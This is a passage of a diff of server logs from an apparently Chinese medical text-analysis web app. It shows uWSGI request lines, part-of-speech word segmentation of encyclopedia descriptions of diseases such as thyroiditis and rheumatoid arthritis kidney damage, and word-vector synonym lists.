'肾上腺', '生殖器官', '腹腔'], '成分': ['成分', '成份', '化学成分', '组分', '含有', '混合物', '所含', '化学物质', '糖类', '掺入'], '时': [], '男性化': ['男性化', '女性化', '神经质', '阳刚', '自恋', '拘谨', '轻蔑', '习惯性', '标新立异', '坦率']}
-
-------end------
-[pid: 9971|app: 0|req: 10/10] 124.160.57.70 () {52 vars in 1100 bytes} [Sat Apr 20 13:09:55 2019] POST /views/distinguish/getDistinguishData/ => generated 3818 bytes in 22688 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 1)
+[pid: 11271|app: 0|req: 2/2] 124.160.57.70 () {44 vars in 967 bytes} [Mon Apr 22 05:31:54 2019] GET /views/console/ => generated 13579 bytes in 671 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 11272|app: 0|req: 1/3] 124.160.57.70 () {44 vars in 976 bytes} [Mon Apr 22 05:31:59 2019] GET /views/myDoctor?id=1 => generated 0 bytes in 790 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 0)
 集合已存在！
 集合已存在！
-[pid: 9971|app: 0|req: 11/11] 124.160.57.70 () {44 vars in 1011 bytes} [Sat Apr 20 13:13:29 2019] GET /views/distinguish/baike?name=%E7%94%B7%E6%80%A7%E5%8C%96&id=8364&label=2 => generated 12067 bytes in 488 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
-[pid: 9971|app: 0|req: 12/12] 124.160.57.70 () {46 vars in 926 bytes} [Sat Apr 20 13:13:47 2019] GET /views/consoles/ => generated 7983 bytes in 468 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-Model loaded succeed [['骶髂筋膜', 'n'], ['脂肪疝', 'n'], ['(', 'w'], ['sacro', 'x'], ['-', 'w'], ['illacfaciallipocele', 'x'], [')', 'w'], ['是', 'v'], ['指', 'v'], ['臀部', 'n'], ['脂肪', 'n'], ['经', 'p'], ['骶髂筋膜', 'n'], ['突出', 'v'], ['形成', 'v'], ['的', 'u'], ['一', 'm'], ['种', 'q'], ['疝', 'g'], ['，', 'w'], ['是', 'v'], ['引起', 'v'], ['腰', 'n'], ['腿痛', 'uw'], ['的', 'u'], ['原因', 'n'], ['之一', 'r'], ['。', 'w'], ['女性', 'n'], ['多', 'd'], ['发', 'v'], ['，', 'w'], ['尤其', 'd'], ['肥胖', 'a'], ['的', 'u'], ['成年', 'v'], ['女性', 'n'], ['多', 'd'], ['发', 'v'], ['，', 'w'], ['男性', 'n'], ['相对', 'd'], ['少见', 'a'], ['。', 'w'], ['骶髂', 'v'], ['关节', 'n'], ['脂肪疝', 'n'], ['最', 'd'], ['典型', 'a'], ['的', 'u'], ['体征', 'v'], ['是', 'v'], ['在', 'p'], ['髂嵴', 'n'], ['上', 'f'], ['缘', 'g'], ['偏', 'a'], ['内侧', 'f'], ['，', 'w'], ['骶髂', 'v'], ['关节', 'n'], ['外', 'f'], ['上方', 'f'], ['皮下', 'f'], ['组织', 'n'], ['内', 'f'], ['可', 'v'], ['触及', 'v'], ['多', 'a'], ['个', 'q'], ['结节', 'n'], ['状', 'g'], ['肿物', 'n'], ['，', 'w'], ['直径', 'n'], ['1～3', 'm'], ['cm', 'q'], ['不', 'd'], ['等', 'u'], ['，', 'w'], ['结节', 'v'], ['质地', 'n'], ['较', 'd'], ['硬', 'a'], ['韧', 'n'], ['，', 'w'], ['弹拨', 'v'], ['或', 'c'], ['按', 'p'], ['压', 'v'], ['时', 'g'], ['出现', 'v'], ['疼痛', 'a'], ['，', 'w'], ['部分', 'm'], ['病人', 'n'], ['在', 'p'], ['指压', 'v'], ['结节', 'n'], ['时', 'g'], ['出现', 'v'], ['腰骶部', 'n'], ['，', 'w'], ['臀部', 'n'], ['或', 'c'], ['同侧', 'f'], ['大腿', 'n'], ['酸', 'a'], ['胀痛', 'uw'], ['，', 'w'], ['结节', 'n'], ['可', 'v'], ['为', 'p'], ['圆形', 'n'], ['，', 'w'], ['椭圆形', 'n'], ['或', 'c'], ['不', 'd'], ['规', 'g'], ['则', 'c'], ['形', 'g'], ['，', 'w'], ['可', 'v'], ['单个', 'a'], ['或', 'c'], ['多', 'a'], ['个', 'q'], ['融合', 'v'], ['在', 'p'], ['一起', 's'], ['。', 'w']]
-
-------end------
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'臀部': ['臀部', '颈部', '胸部', '肩膀', '腰部', '大腿', '腿部', '背部', '肩部', '小腿'], '的': [], '尤其': ['尤其', '特别是在', '尤为', '特别', '常常', '偏爱', '更是', '相比之下', '相比较', '众所周知'], '形': ['形', '状', '形如', '菱形', '方形', '形似', '圆形', '六角形', '锥形', '凸'], '大腿': ['大腿', '膝盖', '肩膀', '小腿', '脚踝', '腿部', '手肘', '臀部', '腰部', '肩部'], '按': [], '形成': ['形成', '构成', '成形', '呈现出', '转变成', '产生', '演化成', '过渡到', '成型', '逐步形成'], '状': ['状', '圆锥形', '螺旋状', '突起', '柱状', '锥形', '锥状', '椭圆形', '管状', '形如'], '，': [], '经': [], '同侧': [], '突出': ['突出', '引人注目', '醒目', '显眼', '明显', '出彩', '厚实', '引人注意', '凸显', '值得注意'], '硬': ['硬', '软', '较硬', '质地', '夹', '硬质', '粗', '粗大', '硬式', '大块'], '发': ['发', '放', '配', '所发', '推', '样', '；不', '发在', '唯', '</s>'], '偏': ['偏', '稍', '弱', '面有', '近于', '浅蓝', '；大', '偏于', '亦然', '</s>'], '胀痛': [], '是': [], '规': ['规', '定', '实', '例', '通则', '原则上', '同上', '先为', '<tr>', '</s>'], '等': [], '(': [], '脂肪': ['脂肪', '脂肪酸', '胆固醇', '碳水化合物', '脂肪组织', '油脂', '饲料', '脂质', '三酸甘油酯', '糖类'], '男性': ['男性', '女性', '成年人', '异性恋', '未成年', '成年', '年长者', '男同性恋', '成人', '年长'], '原因': ['原因', '因素', '情况', '理由', '状况', '可能', '主因', '缘故', '诱因', '或许'], '组织': ['组织', '的组织', '该组织', '秘密组织', '有组织', '一个组织', '民间组织', '其组织', '组织起来', '许多组织'], '体征': ['体征', '病症', '病因', '征状', '征象', '病状', '临床表现', '恶性肿瘤', '哮喘', '先兆'], '为': [], '关节': ['关节', '肌肉', '肌腱', '脊椎', '四肢', '脊柱', '足部', '膝关节', '手部', '腿部'], 'cm': ['cm', 'kg', '吋', 'm', '直径约', 'mm', '高约', 'g', '公克', 'ft'], '1～3': [], '可': [], '指压': [], '较': [], '一': [], '个': [], '一起': ['一起', '一同', '独自', '朋友们', '两人', '三人', '独自一人', '两兄弟', '四人', '一齐'], '===': [], '直径': ['直径', '直径约', '厚度', '宽度', '球形', '高约', '半径', 'cm', '椭圆形', '圆形'], '外': ['外', '之外', '以外', '均', '部份', '皆', '内外', '另有', '除此以外', '则有'], '质地': ['质地', '色泽', '坚硬', '较硬', '疏松', '柔软', '材质', '光泽', '较厚', '外皮'], '结节': ['结节', '软组织', '突起', '下颚', '骨盆', '肌肉组织', '脊柱', '腹腔', '鳞状', '口部'], '上方': ['上方', '下方', '顶部', '右侧', '左侧', '底部', '正上方', '正下方', '顶端', '上端'], '女性': ['女性', '男性', '妇女', '男士', '男人', '异性恋', '成年人', '女同性恋', '未婚', '男同性恋'], '指': ['指', '所指', '就是指', '特指', '指称', '常指', '仅指', '称之为', '所称', '同义'], '病人': ['病人', '患者', '病患', '治疗', '病者', '医护人员', '病患者', '病症', '产妇', '病童'], 'sacro': [], '弹拨': ['弹拨', '独奏曲', '二胡', '拨弦', '打击乐', '古筝', '低音提琴', '艾盖', 'Pardosa', '</s>'], '少见': ['少见', '罕见', '常见', '鲜见', '有名', '普遍', '相似', '出名', '典型', '罕有'], '时': [], '韧': ['韧', '软硬', '体', 'ROM', '软', '微', '芯', '纤', '较厚', '外皮'], '上': [], '腰': ['腰', '肩', '袖', '膝', '颈', '背', '肘', '缠', '眉', '后背'], '缘': ['缘', '细', '蚀', '尘', '微细', '虹', '下部', '如意', '有缘', '故称'], '椭圆形': ['椭圆形', '圆形', '球形', '圆柱形', '卵形', '圆锥形', '卵圆形', '呈圆形', '方形', '椭圆型'], '在': [], '种': [], '融合': ['融合', '结合', '交融', '融入', '糅合', '融汇', '相结合', '混合', '揉合', '融为一体'], '典型': ['典型', '类似于', '类似', '迥然不同', '值得注意', '近似于', '十分相似', '的现代', '相比较', '众所周知'], '部分': ['部分', '部份', '大部分', '一小', '其余部分', '外', '大多', '之外', '以外', '均'], '骶髂筋膜': [], '骶髂': [], '多': [], ')': [], '相对': ['相对', '比较', '相对于', '相对来说', '相比', '相比之下', '相较', '比起', '一般来说', '相比较'], '内侧': ['内侧', '外侧', '侧边', '末端', '前端', '底部', '下方', '下侧', '后侧', '下部'], '-': ['-', '干', '安', '--', '先于', '在在', '时是', '<tr>', 'Pardosa', '</s>'], '则': [], '脂肪疝': [], '酸': ['酸', '碱', '醇', '胺', '酯', '硫', '盐酸', '乙酸', '醛', '硫酸'], '最': [], '或': [], '髂嵴': [], '腰骶部': [], '之一': [], '疼痛': ['疼痛', '痉挛', '肿胀', '头痛', '痛楚', '呕吐', '呼吸困难', '咳嗽', '瘙痒', '眼部'], '疝': ['疝', '溃疡', '筋膜', '腰椎', '胃炎', '腹痛', '关节炎', '外伤', '粘液', '穿孔'], 'illacfaciallipocele': [], '触及': ['触及', '看清', '认清', '触动', '顾及', '聚焦', '紧贴', '退缩', '加诸', '正因如此'], '肥胖': ['肥胖', '体重增加', '糖尿病', '肥胖症', '厌食症', '高血压', '心血管疾病', '老年人', '成年人', '肥大'], '皮下': ['皮下', '皮下组织', '肺部', '静脉', '腹腔', '腹膜', '表皮', '牙龈', '皮肤上', '粘液'], '内': [], '出现': ['出现', '经常出现', '消失', '再次出现', '浮现', '注意到', '用到', '显现出来', '显现', '显现出'], '。': [], '肿物': [], '单个': [], '成年': ['成年', '未成年', '成年人', '男性', '成体', '年长', '刚出生', '孩童', '未满', '幼小'], '不': [], '引起': ['引起', '引发', '引来', '激起', '招致', '惹来', '造成', '导致', '造成了', '引致'], '圆形': ['圆形', '方形', '椭圆形', '长方形', '弧形', '半圆形', '圆锥形', '球形', '呈圆形', '六角形'], '腿痛': [], '压': ['压', '力', '灌入', '受压', '气', '灌注', '压到', '轧', '滚', '拉出']}
-
-------end------
-[pid: 9971|app: 0|req: 13/13] 124.160.57.70 () {52 vars in 1100 bytes} [Sat Apr 20 13:13:56 2019] POST /views/distinguish/getDistinguishData/ => generated 3794 bytes in 24912 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 0)
-[pid: 9971|app: 0|req: 14/14] 124.160.57.70 () {46 vars in 926 bytes} [Sat Apr 20 13:14:30 2019] GET /views/consoles/ => generated 8338 bytes in 563 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-Model loaded succeed [['大便', 'n'], ['稀薄', 'a'], ['，', 'w'], ['甚', 'g'], ['如', 'v'], ['水样', 'n'], ['，', 'w'], ['或', 'c'], ['完', 'v'], ['谷', 'g'], ['不', 'd'], ['化', 'v'], ['，', 'w'], ['并', 'c'], ['多', 'd'], ['有', 'v'], ['排便', 'v'], ['次数', 'n'], ['增多', 'v'], ['。', 'w'], ['迁延', 'v'], ['反复', 'v'], ['，', 'w'], ['腹胀', 'uw'], ['纳差', 'uw'], ['，', 'w'], ['肢', 'g'], ['倦', 'a'], ['乏力', 'a'], ['，', 'w'], ['形', 'g'], ['寒', 'g'], ['肢', 'g'], ['冷', 'a'], ['，', 'w'], ['腰膝酸软', 'uw'], ['，', 'w'], ['舌淡', 'a'], ['，', 'w'], ['苔白', 'n'], ['，', 'w'], ['脉', 'v'], ['沉细', 'a'], ['。', 'w']]
-
-------end------
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'，': [], '纳差': [], '并': [], '不': [], '谷': ['谷', '山', '山下', '山脚下', '山间', '山中', '谷中', '深谷', '石山', '小山'], '。': [], '===': [], '多': [], '苔白': [], '冷': ['冷', '冻', '寒', '冷热', '凝', '冷水', '的水', '稀', '和气', '</s>'], '排便': ['排便', '呕吐', '排尿', '进食', '手淫', '咳嗽', '吞咽', '大便', '阴部', '排泄'], '寒': ['寒', '枯', '冻', '燥', '霜', '雨', '凝', '冷', '云', '暑'], '脉': ['脉', '支脉', '山系', '喜马拉雅山', '主峰', '北麓', '山岭', '山麓', '西麓', '西缘'], '舌淡': [], '如': [], '肢': ['肢', '后肢', '四肢', '趾', '脚掌', '脊椎', '下颚', '颈部', '脚趾', '脊柱'], '增多': ['增多', '激增', '剧增', '增加', '有所增加', '增高', '增大', '渐增', '升高', '快速增长'], '化': ['化', '简化', '本土化', '化时', '转化', '立体化', '解构', '转化成', '既有', '所谓'], '或': [], '形': ['形', '状', '形如', '菱形', '方形', '形似', '圆形', '六角形', '锥形', '凸'], '腹胀': ['腹胀', '便秘', '消化不良', '心悸', '遗精', '烦', '气喘', '肠胃', '头痛', '苦'], '乏力': ['乏力', '力弱', '潘顿', '季初', '可惜', '稍为', '后头', '尾段', '早早', '稍稍'], '有': [], '甚': ['甚', '颇', '甚为', '颇多', '颇为', '甚多', '不及', '足见', '远不如', '稍'], '水样': ['水样', '尿液', '排泄物', '沉淀物', '污泥', '抽血', '氯化钠', '冷水', '水或', '时又'], '次数': ['次数', '数目', '单次', '连续', '周内', '数', '最少', '短时间', '至多', '每一次'], '倦': ['倦', '叹', '恨', '忘', '烦', '奈何', '绝', '痴', '惜', '怀'], '迁延': [], '稀薄': ['稀薄', '平流层', '水蒸气', '黏稠', '气态', '尘粒', '散逸', '液态', '微小', '寻常'], '沉细': [], '大便': ['大便', '小便', '尿', '喝水', '呕吐', '洗手', '睡觉时', '屁股', '水泡', '饱'], '完': ['完', '完了', '完毕', '剩', '先', '放', '再来', '再多', '下回', '紧接'], '反复': ['反复', '重复', '不停', '一再', '长时间', '间歇', '每一次', '有规律', '连续不断', '一一'], '腰膝酸软': []}
-
-------end------
-[pid: 9971|app: 0|req: 15/15] 124.160.57.70 () {52 vars in 1098 bytes} [Sat Apr 20 13:14:40 2019] POST /views/distinguish/getDistinguishData/ => generated 2878 bytes in 19452 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 0)
-[pid: 9971|app: 0|req: 16/16] 124.160.57.70 () {46 vars in 926 bytes} [Sat Apr 20 13:16:47 2019] GET /views/consoles/ => generated 11477 bytes in 952 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-Model loaded succeed [['类风湿性关节炎肾损害', 'uw'], ['是', 'v'], ['由', 'p'], ['类风湿性', 'n'], ['关节炎', 'n'], ['引起', 'v'], ['的', 'u'], ['急', 'a'], ['，', 'w'], ['慢性', 'a'], ['间质性肾炎', 'uw'], ['、', 'w'], ['肾', 'n'], ['淀粉', 'n'], ['样变', 'n'], ['、', 'w'], ['肾脏', 'n'], ['坏死性', 'n'], ['血管炎', 'n'], ['及', 'c'], ['免疫', 'v'], ['复合物性', 'n'], ['肾炎', 'n'], ['，', 'w'], ['并', 'c'], ['伴', 'v'], ['有', 'v'], ['相应', 'v'], ['临床', 'v'], ['表现', 'v'], ['的', 'u'], ['一', 'm'], ['组', 'q'], ['疾病', 'n'], ['。', 'w'], ['本病', 'r'], ['常', 'd'], ['导致', 'v'], ['多', 'm'], ['脏器', 'n'], ['受累', 'v'], ['，', 'w'], ['其', 'r'], ['主要', 'a'], ['并发症', 'n'], ['是', 'v'], ['关节', 'n'], ['破坏', 'v'], ['变形', 'v'], ['，', 'w'], ['关节', 'n'], ['隆', 'n'], ['突位', 'n'], ['出现', 'v'], ['大小', 'n'], ['不', 'd'], ['等', 'a'], ['的', 'u'], ['皮下结节', 'uw'], ['，', 'w'], ['中枢神经受累', 'id'], ['引起', 'v'], ['急性', 'a'], ['或', 'c'], ['慢性', 'a'], ['脑梗死', 'n'], ['或', 'c'], ['出现', 'v'], ['偏瘫', 'v'], ['，', 'w'], ['因此', 'c'], ['，', 'w'], ['该病', 'r'], ['一定', 'd'], ['要', 'v'], ['早', 'a'], ['发现', 'v'], ['早', 'a'], ['治疗', 'v'], ['，', 'w'], ['预防', 'v'], ['严重', 'a'], ['并发症', 'n'], ['。', 'w']]
-
-------end------
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'组': ['组', '两组', '小组', '分组', '四组', '第一组', '三组', '一组', '组成员', '第三组'], '早': ['早', '早于', '更早', '即已', '较早', '晚', '要到', '年前', '就有', '以前'], '类风湿性': ['类风湿性', '关节炎', '痛风', '风湿病', '哮喘', '白血病', '性疾病', '皮肤病', 'Pardosa', '</s>'], '该病': [], '主要': [], '肾炎': ['肾炎', '原发性', '性疾病', '病症', '感染性', '流行性感冒', '膀胱炎', '细菌性', '鼻窦炎', '非典型'], '淀粉': ['淀粉', '糖类', '油脂', '糖', '糖浆', '大豆', '牛奶', '黄豆', '绿豆', '麦芽糖'], '。': [], '发现': ['发现', '找到', '辨认出', '发掘出', '注意到', '挖掘出', '推测', '断定', '见到', '推断出'], '样变': [], '肾脏': ['肾脏', '肝脏', '肿瘤', '甲状腺', '消化道', '心脏', '十二指肠', '胰脏', '脾脏', '肺脏'], '多': [], '引起': ['引起', '引发', '引来', '激起', '招致', '惹来', '造成', '导致', '造成了', '引致'], '、': [], '导致': ['导致', '造成', '致使', '造成了', '引致', '引发', '避免', '所致', '加剧', '随之而来'], '肾': ['肾', '肺', '脾', '肝', '肾脏', '膀胱', '大肠', '胃', '小肠', '消化道'], '表现': ['表现', '展现出', '发挥', '体现', '展现', '展示出', '显出', '乏善可陈', '平庸', '观感'], '由': [], '常': ['常', '经常', '最常', '常常', '时常', '常以', '；也', '不常', '常会', '故常'], '受累': ['受累', '累及', '所致', '肇因', '不止', '好在', '再加', '则有', 'Pardosa', '</s>'], '及': [], '要': [], '预防': ['预防', '防治', '预防措施', '预防性', '防止', '公共卫生', '防范', '传染病', '持续性', '卫生保健'], '破坏': ['破坏', '毁坏', '严重破坏', '摧毁', '损害', '损坏', '受到破坏', '毁损', '摧残', '冲击'], '临床': ['临床', '临床研究', '医学', '诊断', '病理', '流行病学', '药理学', '针灸', '诊疗', '外科'], '的': [], '===': [], '等': [], '偏瘫': [], '是': [], '变形': ['变形', '形变', '扭曲', '挤压', '弯曲', '接合', '碎裂', '剪切', '反转', '结构上'], '免疫': ['免疫', '免疫系统', '抗体', '免疫反应', '特异性', '病原体', '致病', '免疫细胞', '自体', '抗病毒'], '类风湿性关节炎肾损害': [], '相应': ['相应', '适当', '附加', '可视', '具体来说', '也就是说', '都可', '反之亦然', '其所', '除此以外'], '其': [], '一定': [], '脏器': ['脏器', '脑部', '外伤', '脊柱', '肌肉组织', '消化道', '脾脏', '人体内', '肺脏', '各部位'], '血管炎': [], '并': [], '严重': ['严重', '相当严重', '更为严重', '轻微', '导致', '严重影响', '致使', '比较严重', '情况严重', '不堪重负'], '皮下结节': [], '，': [], '有': [], '出现': ['出现', '经常出现', '消失', '再次出现', '浮现', '注意到', '用到', '显现出来', '显现', '显现出'], '伴': ['伴', '相伴', '友', '喜', '常在', '<BR>', '于其', '；还有', 'Pardosa', '</s>'], '突位': [], '脑梗死': [], '疾病': ['疾病', '病症', '传染病', '性疾病', '病因', '癌症', '营养不良', '哮喘', '疟疾', '结核病'], '或': [], '因此': [], '急': ['急', '缓', '遽', '难', '见', '催', '不意', '不下', '引', '稍稍'], '关节炎': ['关节炎', '哮喘', '病征', '病症', '类风湿性', '痛风', '性疾病', '溃疡', '高血压', '皮肤病'], '隆': ['隆', '利', '福', '博', '赖', '良', '安', '冈', '富', '丰'], '中枢神经受累': [], '复合物性': [], '大小': ['大小', '尺寸', '形状', '体积', '较小', '不等', '个数', '微小', '大小不一', '一般来说'], '急性': [], '治疗': ['治疗', '化疗', '疗法', '治疗法', '病人', '病患', '用药', '疗程', '放射治疗', '外科手术'], '坏死性': [], '并发症': ['并发症', '败血症', '肾衰竭', '肺炎', '中风', '癌症', '出血', '肝硬化', '心肌梗死', '胃癌'], '间质性肾炎': [], '本病': ['本病', '临床表现', '病症', '病因', '结节病', '病变', '病源', '结核', '性疾病', '发于'], '不': [], '慢性': [], '关节': ['关节', '肌肉', '肌腱', '脊椎', '四肢', '脊柱', '足部', '膝关节', '手部', '腿部'], '一': []}
-
-------end------
-[pid: 9971|app: 0|req: 17/17] 124.160.57.70 () {52 vars in 1100 bytes} [Sat Apr 20 13:17:00 2019] POST /views/distinguish/getDistinguishData/ => generated 8582 bytes in 23821 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 0)
-[pid: 9971|app: 0|req: 18/18] 124.160.57.70 () {46 vars in 926 bytes} [Sat Apr 20 13:17:36 2019] GET /views/consoles/ => generated 14070 bytes in 715 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-Model loaded succeed [['甲状腺炎', 'n'], ['是', 'v'], ['以', 'p'], ['炎症', 'n'], ['为', 'v'], ['主要', 'a'], ['表现', 'v'], ['的', 'u'], ['甲状腺疾病', 'uw'], ['，', 'w'], ['包括', 'v'], ['感染性', 'n'], ['和', 'c'], ['非感染性', 'n'], ['。', 'w'], ['甲状腺炎', 'n'], ['的', 'u'], ['临床', 'v'], ['分类', 'v'], ['多样', 'm'], ['，', 'w'], ['按', 'v'], ['起病', 'v'], ['快慢', 'n'], ['分为', 'v'], ['急性化脓性甲状腺炎', 'uw'], ['、', 'w'], ['亚急性', 'n'], ['甲状腺炎', 'n'], ['和', 'c'], ['慢性', 'a'], ['甲状腺炎', 'n'], ['。', 'w'], ['亚急性', 'n'], ['甲状腺炎', 'n'], ['又', 'd'], ['进一步', 'd'], ['分为', 'v'], ['亚急性', 'n'], ['肉芽肿性', 'n'], ['甲状腺炎', 'n'], ['(', 'w'], ['即', 'v'], ['亚甲炎', 'n'], [')', 'w'], ['和', 'c'], ['亚急性', 'n'], ['淋巴细胞性', 'n'], ['甲状腺炎', 'n'], ['(', 'w'], ['无痛性甲状腺炎', 'uw'], [')', 'w'], ['，', 'w'], ['后者', 'r'], ['进一步', 'd'], ['分为', 'v'], ['散发性', 'n'], ['甲状腺炎', 'n'], ['和', 'c'], ['产后甲状腺炎', 'uw'], ['。', 'w'], ['慢性', 'a'], ['甲状腺炎', 'n'], ['包括', 'v'], ['慢性淋巴细胞性甲状腺炎', 'uw'], ['(', 'w'], ['桥本', 'np'], ['甲状腺炎', 'n'], [')', 'w'], ['和', 'c'], ['慢性纤维性甲状腺炎', 'uw'], ['。', 'w'], ['按', 'p'], ['病原学', 'n'], ['分类', 'v'], ['，', 'w'], ['可', 'v'], ['分为', 'v'], ['细菌性', 'n'], ['、', 'w'], ['病毒性', 'n'], ['、', 'w'], ['自身', 'r'], ['免疫性', 'n'], ['、', 'w'], ['辐射', 'v'], ['后', 'f'], ['、', 'w'], ['寄生虫', 'n'], ['、', 'w'], ['结核性', 'n'], ['、', 'w'], ['梅毒', 'np'], ['和', 'c'], ['爱滋病', 'n'], ['感染', 'v'], ['等', 'u'], ['。', 'w'], ['临床', 'v'], ['上', 'f'], ['最', 'd'], ['常见', 'a'], ['的', 'u'], ['甲状腺炎', 'n'], ['是', 'v'], ['慢性淋巴细胞性甲状腺炎', 'uw'], ['和', 'c'], ['亚急性', 'n'], ['肉芽肿性', 'n'], ['甲状腺炎', 'n'], ['，', 'w'], ['无痛性甲状腺炎', 'uw'], ['临床', 'v'], ['上', 'f'], ['也', 'd'], ['经常', 'd'], ['会', 'v'], ['看到', 'v'], ['，', 'w'], ['从', 'p'], ['病原学', 'n'], ['角度', 'n'], ['最', 'd'], ['常见', 'a'], ['的', 'u'], ['是', 'v'], ['自身', 'r'], ['免疫性', 'n'], ['甲状腺炎', 'n'], ['。', 'w']]
-
-------end------
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'桥本': ['桥本', '佐藤', '高桥', '田中', '野田', '小林', '广濑', '三木', '星野', '伊藤'], '也': [], '亚急性': [], '辐射': ['辐射', '电磁辐射', '紫外线', '宇宙射线', '太阳光', '微波', '热辐射', '伽马射线', '放射', '高能量'], '快慢': ['快慢', '高低', '待发', '可调', '扣压', '操作方法', '开合', '回转', '错开', '向后'], '后': [], '、': [], '慢性淋巴细胞性甲状腺炎': [], '自身': [], '。': [], '主要': [], '慢性纤维性甲状腺炎': [], '细菌性': ['细菌性', '念珠菌', '脑膜炎', '阴道炎', '泌尿道', '病毒性', '感染性', '流行性感冒', '皮肤病', '非典型'], '角度': ['角度', '视角', '取向', '出发点', '尺度', '本质', '并不一定', '相反', '角度看', '某种程度'], '，': [], '爱滋病': ['爱滋病', '艾滋病', '爱滋', 'HIV', '癌症', 'AIDS', '美国疾病控制与预防中心', 'SARS', '乳癌', '乙型肝炎'], '===': [], '即': [], '包括': ['包括', '还包括', '包含', '都有', '最主要', '仅限于', '以外', '除此以外', '之外', '有数'], '可': [], '经常': ['经常', '常常', '时常', '不时', '常', '偶尔', '往往', '常会', '平常', '特别'], ')': [], '产后甲状腺炎': [], '甲状腺疾病': [], '亚甲炎': [], '按': [], '从': [], '后者': [], '临床': ['临床', '临床研究', '医学', '诊断', '病理', '流行病学', '药理学', '针灸', '诊疗', '外科'], '甲状腺炎': [], '病原学': [], '感染性': ['感染性', '致病', '病原体', '病原', '细菌感染', '脑膜炎', '病毒性', '细菌性', '泌尿道', '百日咳'], '淋巴细胞性': [], '是': [], '急性化脓性甲状腺炎': [], '慢性': [], '分类': ['分类', '归类', '分类法', '定义', '分类学', '归入', '类群', '归纳', '形态学', '界定'], '的': [], '以': [], '病毒性': ['病毒性', '病原', '传染病', '流行性感冒', '致病', '细菌性', '感染性', '丙型肝炎', '水痘', '白喉'], '和': [], '又': [], '多样': ['多样', '多样化', '丰富', '独特', '繁多', '多种不同', '丰富多彩', '新颖', '典型', '独有'], '梅毒': ['梅毒', '肺结核', '丙型肝炎', '结核病', '胃癌', '子宫颈癌', '脊髓灰质炎', '流行性感冒', '膀胱癌', '白喉'], '常见': ['常见', '少见', '常用', '罕见', '常见于', '相似', '类似', '典型', '类似于', '少用'], '表现': ['表现', '展现出', '发挥', '体现', '展现', '展示出', '显出', '乏善可陈', '平庸', '观感'], '感染': ['感染', '病毒感染', '传染', '受到感染', '细菌感染', '病毒', '感染者', '染病', '接种', '病菌'], '散发性': [], '肉芽肿性': [], '分为': ['分为', '分成', '分作', '细分', '分别为', '划分', '包含', '统称', '总称', '可分'], '为': [], '会': ['会', '不会', '都会', '可能会', '则会', '就会', '才会', '时会', '亦会', '但会'], '非感染性': [], '等': [], '最': [], '炎症': ['炎症', '发炎', '病变', '水肿', '增生', '坏死', '瘙痒', '黏膜', '上皮细胞', '呼吸道'], '上': [], '进一步': ['进一步', '更进一步', '促使', '有利于', '全面性', '必要性', '全面', '实质性', '大幅度', '再进一步'], '(': [], '结核性': [], '寄生虫': ['寄生虫', '病原体', '细菌', '毒素', '病菌', '蟑螂', '节肢动物', '跳蚤', '病原', '蚊子'], '起病': ['起病', '发病', '精神分裂症', '偏头痛', '发作', '失忆症', '病症', '发于', '风湿热', '非典型'], '免疫性': ['免疫性', '免疫', '自身免疫', '细菌性', '免疫缺陷', '特异性', '性疾病', '强效', '诱发', '非典型'], '无痛性甲状腺炎': [], '看到': ['看到', '看见', '见到', '看不到', '看着', '注意到', '碰到', '认出', '看得见', '想到']}
-
-------end------
-[pid: 9971|app: 0|req: 19/19] 124.160.57.70 () {52 vars in 1100 bytes} [Sat Apr 20 13:17:46 2019] POST /views/distinguish/getDistinguishData/ => generated 9167 bytes in 25862 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 0)
-[pid: 9971|app: 0|req: 20/20] 124.160.57.70 () {44 vars in 880 bytes} [Sat Apr 20 13:20:28 2019] GET /views/consoles/ => generated 10362 bytes in 423 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-------start------
-[connect success] | ip : 39.108.111.94
-result:
